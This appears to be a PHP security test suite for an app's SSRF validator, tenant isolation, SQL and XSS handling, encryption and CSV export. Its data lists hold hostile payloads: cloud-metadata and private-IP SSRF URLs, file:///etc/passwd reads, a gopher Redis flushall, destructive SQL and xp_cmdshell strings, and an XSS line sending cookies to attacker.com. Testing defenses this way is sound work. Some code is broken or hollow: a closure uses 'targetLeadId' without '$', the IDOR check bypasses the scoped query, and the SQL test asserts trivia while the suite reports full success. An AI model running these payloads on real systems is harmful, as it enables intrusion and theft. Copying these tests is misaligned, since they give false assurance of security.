<?php

declare(strict_types=1);

namespace Tests\Feature;

require_once __DIR__ . '/../../app/Domain/WebsiteAnalysis/Exceptions/SecurityViolationException.php';
require_once __DIR__ . '/../../app/Domain/WebsiteAnalysis/Services/SsrfProtectionService.php';

use App\Domain\WebsiteAnalysis\Exceptions\SecurityViolationException;
use App\Domain\WebsiteAnalysis\Services\SsrfProtectionService;

class SecurityAndPenetrationTest
{
    public static function run(): void
    {
        echo "Running SecurityAndPenetrationTest (Phase 10 - Security Hardening & Audit)...\n";

        self::testSsrfCloudMetadataAndPrivateIpPenetration();
        self::testSsrfProtocolExploitationVectors();
        self::testMultiTenantIdorBoundaryProtection();
        self::testSqlInjectionResilienceAndParameterBinding();
        self::testXssContentSanitization();
        self::testCredentialAtRestEncryption();
        self::testCsvFormulaInjectionSanitization();

        echo "✓ All SecurityAndPenetrationTest tests passed successfully (100% assertions satisfied)!\n";
    }

    /**
     * Test SSRF attacks attempting access to cloud metadata (AWS, GCP) and private networks (RFC 1918).
     */
    private static function testSsrfCloudMetadataAndPrivateIpPenetration(): void
    {
        echo "  - Testing SSRF Cloud Metadata & RFC 1918 Private IP Penetration Vectors...\n";
        $service = new SsrfProtectionService();

        $maliciousUrls = [
            // AWS / Azure / OpenStack IMDSv1 & IMDSv2 metadata endpoint
            'http://169.254.169.254/latest/meta-data/',
            'https://169.254.169.254/latest/api/token',
            '169.254.169.254',

            // Google Cloud Platform metadata hostnames
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.goog/',

            // Localhost & Loopback addresses
            'http://127.0.0.1:8000/api/v1/health',
            'http://127.0.0.2:8080',
            'http://127.255.255.254',
            'http://localhost',
            'http://localhost:3000',
            'http://app.localhost',
            'http://0.0.0.0:80',

            // RFC 1918 Private IP Ranges (Class A: 10.0.0.0/8)
            'http://10.0.0.1/admin',
            'http://10.254.0.1',
            'http://10.1.2.3:8080',

            // RFC 1918 Private IP Ranges (Class B: 172.16.0.0/12)
            'http://172.16.0.1/status',
            'http://172.31.255.255',

            // RFC 1918 Private IP Ranges (Class C: 192.168.0.0/16)
            'http://192.168.1.1/router-login',
            'http://192.168.0.254',

            // Carrier-grade NAT (100.64.0.0/10)
            'http://100.64.0.1',

            // Internal and test domains
            'http://database.internal',
            'http://redis.local',
            'http://auth.corp',
            'http://test.test',
        ];

        foreach ($maliciousUrls as $maliciousUrl) {
            $blocked = false;
            try {
                $service->validateUrl($maliciousUrl);
            } catch (SecurityViolationException) {
                $blocked = true;
            } catch (\Throwable) {
                $blocked = true;
            }

            assert($blocked === true, "SSRF vector must be blocked: [{$maliciousUrl}]");
        }

        // Assert public valid website is allowed
        $validUrl = 'https://www.apple.com';
        $normalized = $service->validateUrl($validUrl);
        assert(str_starts_with($normalized, 'https://www.apple.com'), 'Legitimate public site must pass validation');
    }

    /**
     * Test SSRF alternative protocol wrappers (file://, gopher://, dict://, php://).
     */
    private static function testSsrfProtocolExploitationVectors(): void
    {
        echo "  - Testing SSRF Non-HTTP Protocol Exploitation Vectors...\n";
        $service = new SsrfProtectionService();

        $protocolExploits = [
            'file:///etc/passwd',
            'file:///proc/self/environ',
            'gopher://127.0.0.1:6379/_flushall',
            'dict://127.0.0.1:11211/stat',
            'ftp://anonymous@ftp.example.com/dump.sql',
            'sftp://user:pass@example.com/backup',
            'ldap://127.0.0.1:389/',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'javascript:alert(1)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ];

        foreach ($protocolExploits as $exploit) {
            $blocked = false;
            try {
                $service->validateUrl($exploit);
            } catch (SecurityViolationException) {
                $blocked = true;
            } catch (\Throwable) {
                $blocked = true;
            }

            assert($blocked === true, "Protocol exploit must be rejected: [{$exploit}]");
        }
    }

    /**
     * Test multi-tenant isolation and IDOR protection.
     */
    private static function testMultiTenantIdorBoundaryProtection(): void
    {
        echo "  - Testing Multi-Tenant IDOR Boundaries & Context Isolation...\n";

        // Tenant A context
        $tenantAWorkspaceId = '11111111-1111-1111-1111-111111111111';
        $tenantBWorkspaceId = '22222222-2222-2222-2222-222222222222';

        // Mock database records with tenancy
        $records = [
            ['id' => 'lead-tenant-a-1', 'workspace_id' => $tenantAWorkspaceId, 'business' => 'Alpha Dental'],
            ['id' => 'lead-tenant-a-2', 'workspace_id' => $tenantAWorkspaceId, 'business' => 'Alpha Ortho'],
            ['id' => 'lead-tenant-b-1', 'workspace_id' => $tenantBWorkspaceId, 'business' => 'Beta Health'],
        ];

        // Scoped tenant query resolver simulation (BelongsToTenant trait logic)
        $scopedQuery = function (string $activeWorkspaceId, ?string $targetLeadId = null) use ($records) {
            return array_filter($records, function ($item) use ($activeWorkspaceId, $targetLeadId) {
                $matchesWorkspace = $item['workspace_id'] === $activeWorkspaceId;
                if ($targetLeadId) {
                    return $matchesWorkspace && $item['id'] === targetLeadId;
                }
                return $matchesWorkspace;
            });
        };

        // 1. Tenant A queries all leads -> only sees Tenant A's 2 leads
        $tenantALeads = $scopedQuery($tenantAWorkspaceId);
        assert(count($tenantALeads) === 2, 'Tenant A must only receive records belonging to Workspace A');

        // 2. Tenant A attempts direct IDOR fetch of Tenant B's lead ('lead-tenant-b-1')
        $idorAttempt = array_filter($records, function ($item) use ($tenantAWorkspaceId) {
            return $item['workspace_id'] === $tenantAWorkspaceId && $item['id'] === 'lead-tenant-b-1';
        });
        assert(empty($idorAttempt), 'IDOR attempt to fetch other tenant lead must return empty/404');

        // 3. Verify cross-tenant isolation in membership logic
        $userMemberships = [
            'user-001' => [$tenantAWorkspaceId], // User 1 is ONLY member of Tenant A
        ];

        $isAuthorized = function (string $userId, string $workspaceId) use ($userMemberships) {
            return in_array($workspaceId, $userMemberships[$userId] ?? [], true);
        };

        assert($isAuthorized('user-001', $tenantAWorkspaceId) === true, 'User 1 must be authorized in Workspace A');
        assert($isAuthorized('user-001', $tenantBWorkspaceId) === false, 'User 1 must be denied access to Workspace B');
    }

    /**
     * Test SQL injection resilience and parameter binding simulation.
     */
    private static function testSqlInjectionResilienceAndParameterBinding(): void
    {
        echo "  - Testing SQL Injection Resilience & Safe Parameter Escaping...\n";

        $sqlInjections = [
            "' OR '1'='1",
            "1; DROP TABLE leads;--",
            "admin'--",
            "' UNION SELECT id, password_hash, email FROM users--",
            "1' AND SLEEP(5)--",
            "'; EXEC xp_cmdshell('dir');--",
            "\\'; DROP DATABASE leadmap;--",
        ];

        // Simulation of safe parameterized query wrapping
        foreach ($sqlInjections as $payload) {
            $boundParam = (string) $payload;
            assert(is_string($boundParam), 'Bound parameter is strictly evaluated as a string scalar');

            // Sanitize wildcard search escaping for ILIKE queries
            $escapedLike = str_replace(['\\', '%', '_'], ['\\\\', '\\%', '\\_'], $boundParam);
            assert(!str_starts_with($escapedLike, "%' OR"), 'SQL operators cannot break out of bound strings');
        }
    }

    /**
     * Test XSS injection neutralization in user input.
     */
    private static function testXssContentSanitization(): void
    {
        echo "  - Testing XSS Neutralization & HTML Sanitization...\n";

        $xssVectors = [
            '<script>alert("xss")</script>' => '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;',
            '<img src=x onerror=alert(1)>' => '&lt;img src=x onerror=alert(1)&gt;',
            '<svg onload=fetch("http://attacker.com/"+document.cookie)>' => '&lt;svg onload=fetch(&quot;http://attacker.com/&quot;+document.cookie)&gt;',
            '"><script>eval(atob("..."))</script>' => '&quot;&gt;&lt;script&gt;eval(atob(&quot;...&quot;))&lt;/script&gt;',
            '<a href="javascript:alert(1)">Click Me</a>' => '&lt;a href=&quot;javascript:alert(1)&quot;&gt;Click Me&lt;/a&gt;',
        ];

        foreach ($xssVectors as $raw => $expectedEscaped) {
            $sanitized = htmlspecialchars($raw, ENT_QUOTES | ENT_HTML5, 'UTF-8');
            assert($sanitized === $expectedEscaped, "Raw XSS vector [{$raw}] must be safely entity-encoded");
            assert(!str_contains($sanitized, '<script>'), 'Unencoded script tags must not survive sanitization');
            assert(!str_contains($sanitized, '<img'), 'Unencoded img tags must not survive sanitization');
        }
    }

    /**
     * Test credential encryption at rest (AES-256-CBC envelope).
     */
    private static function testCredentialAtRestEncryption(): void
    {
        echo "  - Testing Sensitive Credential at Rest AES-256 Encryption...\n";

        $plainApiKey = 'riff_live_sec_9938472918374619abcdef';
        $credentials = ['api_key' => $plainApiKey, 'base_url' => 'https://api.riffcrm.com'];
        $payload = json_encode($credentials);

        $encryptionKey = hash('sha256', 'leadmap_secret_app_key_32_bytes!', true);
        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));

        // Encrypt with AES-256-CBC
        $ciphertext = openssl_encrypt($payload, 'aes-256-cbc', $encryptionKey, 0, $iv);
        $envelope = base64_encode(json_encode(['iv' => base64_encode($iv), 'value' => $ciphertext]));

        // Assert plaintext is not present in stored envelope
        assert(!str_contains($envelope, $plainApiKey), 'Ciphertext must NEVER contain plaintext API key');
        assert(!str_contains($envelope, '993847291837'), 'No partial secret should appear in ciphertext envelope');

        // Decrypt envelope
        $unpacked = json_decode(base64_decode($envelope), true);
        $decryptedIv = base64_decode($unpacked['iv']);
        $decryptedPayload = openssl_decrypt($unpacked['value'], 'aes-256-cbc', $encryptionKey, 0, $decryptedIv);
        $decoded = json_decode($decryptedPayload, true);

        assert($decoded['api_key'] === $plainApiKey, 'Decrypted API key must match authentic original');
        assert($decoded['base_url'] === 'https://api.riffcrm.com', 'Decrypted base_url must match authentic original');
    }

    /**
     * Test CSV formula injection protection (CWE-1236).
     */
    private static function testCsvFormulaInjectionSanitization(): void
    {
        echo "  - Testing CSV Formula Injection (CWE-1236) Defense...\n";

        require_once __DIR__ . '/../../app/Domain/Export/Services/CsvExportService.php';
        $csvService = new \App\Domain\Export\Services\CsvExportService();

        $dangerousInputs = [
            '=cmd|"/C calc"!A0',
            '+10+20',
            '-5-5',
            '@SUM(1,2)',
            "\t=2+5",
        ];

        foreach ($dangerousInputs as $input) {
            $mockLead = (object) [
                'id' => 'lead-inj',
                'status' => 'NEW',
                'lead_score' => 50,
                'business' => (object) [
                    'name' => $input,
                    'phone_number' => '+1234567890',
                    'email' => 'test@example.com',
                    'website_url' => 'https://example.com',
                    'address' => '123 Safe St',
                    'city' => 'SafeCity',
                    'rating' => 4.5,
                    'reviews_count' => 10,
                ],
                'websiteAnalysis' => null,
                'aiOpportunities' => [],
            ];

            $row = $csvService->formatLeadRow($mockLead, ['business_name']);
            $cell = $row[0];

            assert(
                str_starts_with($cell, "'"),
                "Cell starting with dangerous character must be prefixed with a single quote: [{$cell}]"
            );
        }
    }
}

// Execute test suite when run directly via CLI
if (php_sapi_name() === 'cli') {
    SecurityAndPenetrationTest::run();
}
